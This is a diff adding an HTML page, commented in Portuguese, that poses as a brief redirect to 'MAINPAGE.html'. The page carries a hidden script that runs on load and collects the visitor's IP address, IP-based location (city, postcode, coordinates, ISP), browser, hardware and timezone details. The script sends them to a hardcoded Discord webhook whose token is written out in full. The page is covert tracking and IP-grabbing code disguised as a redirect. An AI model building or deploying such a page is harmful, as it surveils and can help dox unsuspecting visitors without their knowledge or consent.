@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecionando...</title>
+    <meta http-equiv="refresh" content="3;url=MAINPAGE.html" />
+</head>
+<body>
+    <p>Redirecionando em 3 segundos...</p>
+
+    <script>
+    // 🔥 SUBSTITUA ESTA URL PELA SUA WEBHOOK DO DISCORD
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1442733558752870493/ioE6gt35WIxLniiZOXkaPsoCOt4KI_1i0V4lXSXIUE-4Z5bX678yrdtVcs804_suEBym";
+
+    async function collectSystemInfo() {
+        const ip = await getIP();
+        const locationData = await getIPLocation(ip);
+
+        const info = {
+            // Informações de Rede
+            ip: ip,
+            timestamp: new Date().toISOString(),
+            
+            // 🔥 LOCALIZAÇÃO DETALHADA
+            location: locationData,
+            
+            // Navegador e Sistema
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages,
+            cookieEnabled: navigator.cookieEnabled,
+            
+            // Tela/Display
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth
+            },
+            
+            // Viewport
+            viewport: {
+                width: window.innerWidth,
+                height: window.innerHeight
+            },
+            
+            // Timezone
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            
+            // Hardware
+            hardware: {
+                cores: navigator.hardwareConcurrency || 'N/A',
+                memory: navigator.deviceMemory || 'N/A'
+            },
+            
+            // Conexão
+            connection: navigator.connection ? {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt
+            } : 'N/A',
+            
+            // Plugins
+            plugins: Array.from(navigator.plugins || []).map(p => p.name),
+            
+            // Referência
+            referrer: document.referrer,
+            url: window.location.href
+        };
+
+        console.log('=== INFORMAÇÕES DO SISTEMA ===');
+        console.table(info);
+        
+        // 🔥 ENVIA PARA DISCORD
+        if (WEBHOOK_URL && WEBHOOK_URL !== "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI") {
+            await sendToDiscord(info);
+        }
+        
+        return info;
+    }
+
+    async function getIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            return 'IP não disponível';
+        }
+    }
+
+    // 🔥 FUNÇÃO PARA GEOLOCALIZAÇÃO POR IP
+    async function getIPLocation(ip) {
+        try {
+            if (ip === 'IP não disponível' || ip === '127.0.0.1') {
+                return { error: 'IP local/localhost' };
+            }
+
+            // Usando API gratuita de geolocalização
+            const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
+            const data = await response.json();
+            
+            if (data.status === 'success') {
+                return {
+                    country: data.country,
+                    region: data.regionName,
+                    city: data.city,
+                    zip: data.zip,
+                    coordinates: `${data.lat}, ${data.lon}`,
+                    isp: data.isp,
+                    timezone: data.timezone,
+                    organization: data.org
+                };
+            } else {
+                return { error: data.message };
+            }
+        } catch (error) {
+            return { error: 'Falha na geolocalização' };
+        }
+    }
+
+    // 🔥 FUNÇÃO PARA ENVIAR AO DISCORD
+    async function sendToDiscord(data) {
+        try {
+            let locationText = '📍 **Localização Não Disponível**';
+            
+            if (data.location && !data.location.error) {
+                locationText = `**📍 Localização por IP:**\n**País:** ${data.location.country}\n**Estado:** ${data.location.region}\n**Cidade:** ${data.location.city}\n**CEP:** ${data.location.zip}\n**Coordenadas:** ${data.location.coordinates}\n**ISP:** ${data.location.isp}\n**Org:** ${data.location.organization}`;
+            } else if (data.location && data.location.error) {
+                locationText = `**📍 Localização:** ${data.location.error}`;
+            }
+
+            const message = {
+                content: "🚨 **Nova Conexão Detectada**",
+                embeds: [
+                    {
+                        title: "📊 Informações do Sistema",
+                        color: 0xff0000,
+                        fields: [
+                            {
+                                name: "🌐 IP e Rede",
+                                value: `**IP:** ${data.ip}\n**Referência:** ${data.referrer || 'Direto'}\n**URL:** ${data.url}`,
+                                inline: false
+                            },
+                            {
+                                name: "📍 Geolocalização",
+                                value: locationText,
+                                inline: false
+                            },
+                            {
+                                name: "💻 Sistema",
+                                value: `**Plataforma:** ${data.platform}\n**User Agent:** ${data.userAgent}\n**Idioma:** ${data.language}`,
+                                inline: false
+                            },
+                            {
+                                name: "🖥️ Hardware",
+                                value: `**Núcleos:** ${data.hardware.cores}\n**Memória:** ${data.hardware.memory}GB\n**Tela:** ${data.screen.width}x${data.screen.height}`,
+                                inline: true
+                            },
+                            {
+                                name: "🌍 Timezone",
+                                value: `**Timezone:** ${data.timezone}\n**Data/Hora:** ${new Date(data.timestamp).toLocaleString('pt-BR')}`,
+                                inline: true
+                            }
+                        ],
+                        timestamp: data.timestamp
+                    }
+                ]
+            };
+
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message)
+            });
+            
+            console.log('✅ Dados enviados para Discord');
+        } catch (error) {
+            console.error('❌ Erro ao enviar para Discord:', error);
+        }
+    }
+
+    // Executa a coleta
+    collectSystemInfo();
+    </script>
+</body>
+</html>
